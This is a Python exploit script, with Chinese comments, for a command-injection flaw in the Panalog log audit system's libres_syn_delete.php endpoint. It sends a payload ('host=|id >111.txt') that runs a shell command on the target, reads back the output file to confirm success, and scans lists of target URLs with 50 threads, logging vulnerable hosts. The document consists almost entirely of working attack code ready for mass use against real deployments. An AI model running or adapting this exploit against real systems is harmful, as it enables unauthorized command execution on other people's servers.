# Panalog大数据日志审计系统libres_syn_delete.php存在命令执行

import argparse
from multiprocessing.dummy import Pool
import requests,requests_raw
import sys,os
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                             author:watermelon_xz🍉
                          version:Panalog大数据日志审计系统libres_syn_delete.php存在命令执行

"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="Panalog大数据日志审计系统libres_syn_delete.php存在命令执行")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
def poc(target):
    payload = '/content-apply/libres_syn_delete.php'
    url = target+payload
    headers = {
            "User-Agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Content-Length":"30",
            "Accept":"*/*",
            "Accept-Encoding":"gzip, deflate",
            "Connection":"close",
            "Content-Type":"application/x-www-form-urlencoded",
    }
    data = '''token=1&id=2&host=|id >111.txt'''

    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies,timeout=10)
        # print(re.text)
        if re.status_code == 200 and '{"yn":"yes","str":"OK"}' in re.text:
            # print("200啦")
            payload2='/content-apply/111.txt'
            url2=target+payload2
            res=requests.get(url=url2,headers=headers,verify=False,proxies=proxies,timeout=10)
            if res.status_code == 200 and 'uid' in res.text:
                print('111')
                print(f'[+++]该{target}存在Panalog大数据日志审计系统libres_syn_delete.php存在命令执行\n命令执行结果请访问{url2}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True
        else:
            print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()